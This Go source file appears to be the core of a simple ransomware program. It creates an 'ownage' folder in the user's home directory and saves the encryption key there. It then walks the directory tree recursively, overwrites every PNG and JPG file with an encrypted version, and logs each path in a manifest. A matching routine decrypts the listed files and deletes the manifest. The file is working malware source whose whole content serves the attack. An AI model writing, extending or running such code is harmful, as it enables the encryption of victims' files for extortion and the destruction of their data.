package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"os"
	"os/user"
	"path/filepath"
	"strings"
)

var TargetExtensions = [...]string{
	"png",
	"jpg",
	"JPG",
}

var manifestFolder string = func() string {
	u, err := user.Current()
	if err != nil {
		fmt.Println("Could not get current user!")
		panic(err)
	}
	return filepath.Join(u.HomeDir, "ownage")
}()
var manifest string = filepath.Join(manifestFolder, "manifest")

func getManifest() *os.File {
	var mnf *os.File
	err := os.MkdirAll(manifestFolder, 0777)
	if err != nil {
		fmt.Printf("Could not create manifest folder: %s\n", manifestFolder)
	}
	mnf, err = os.OpenFile(manifest, os.O_RDWR|os.O_APPEND, 0777)
	if err != nil {
		if strings.Contains(err.Error(), "no such file") {
			fmt.Printf("Manifest file not found, creating.\n")
			mnf, err = os.Create(manifest)
			if err == nil {
				return mnf
			}
		}
		fmt.Printf("Could not create manifest file! (%s) Aborting!\n", manifest)
		panic(err)
	}
	return mnf
}

func dropKey(key []byte) {
	err := ioutil.WriteFile(filepath.Join(manifestFolder, "key"), key, 0644)
	if err != nil {
		fmt.Printf("Could not write key file! Abort!\n")
		panic(err)
	}
}

func WalkPath(path string, key []byte) {
	mnf := getManifest()
	dropKey(key)
	defer mnf.Close()
	fmt.Printf("Shitting all over %s\n", path)
	files, err := ioutil.ReadDir(path)
	if err != nil {
		fmt.Println(err)
		return
	}
	for _, f := range files {
		if f.IsDir() {
			WalkPath(filepath.Join(path, f.Name()), key)
		} else {
			if IsTarget(f.Name()) {
				targetfile := filepath.Join(path, f.Name())
				filebytes, err := ioutil.ReadFile(targetfile)
				if err != nil {
					fmt.Println("Could not read: ", f.Name())
					continue
				}
				filebytes, err = encrypt(key, filebytes)
				if err != nil {
					fmt.Printf("Could not encrypt: %s\n", f.Name())
				} else {
					fmt.Printf("encrypted: %s\n", f.Name())
					_, err := mnf.WriteString(targetfile + "\n")
					if err != nil {
						fmt.Printf("Could not write into manifest!\n")
						panic(err)
					}
				}
				err = ioutil.WriteFile(targetfile, filebytes, 0644) //  TODO: same perms as original!!
				if err != nil {
					fmt.Println("Could not write encrypted file: %s\n", f.Name())
				}
			}
		}
	}
}

func IsTarget(path string) bool {
	for _, e := range TargetExtensions {
		if strings.HasSuffix(path, e) {
			return true
		}
	}
	return false
}

func DecryptManifest(mnfPath string, key []byte) {
	file, err := os.Open(mnfPath)
	if err != nil {
		fmt.Println("Could not read manifest!")
		panic(err)
	}
	defer file.Close()
	sc := bufio.NewScanner(file)
	for sc.Scan() {
		f := sc.Text()
		filebytes, err := ioutil.ReadFile(f)
		if err != nil {
			fmt.Println("Could not read: ", f)
			continue
		}
		filebytes, err = decrypt(key, filebytes)
		if err != nil {
			fmt.Printf("Could not decrypt: %s\n", f)
		} else {
			fmt.Printf("decrypted: %s\n", f)
		}
		err = ioutil.WriteFile(f, filebytes, 0644) //  TODO: same perms as original!!
		if err != nil {
			fmt.Println("Could not write decrypted: %s\n", f)
		}
	}
	if err := sc.Err(); err != nil {
		fmt.Println("Errors came up when reading scanning manifest!")
		panic(err)
	} else {
		fmt.Printf("All done. Removing manifest: %s\n", manifest)
		err := os.Remove(manifest)
		if err != nil {
			fmt.Println("Could not remove manifest file.\n")
		}
	}

}
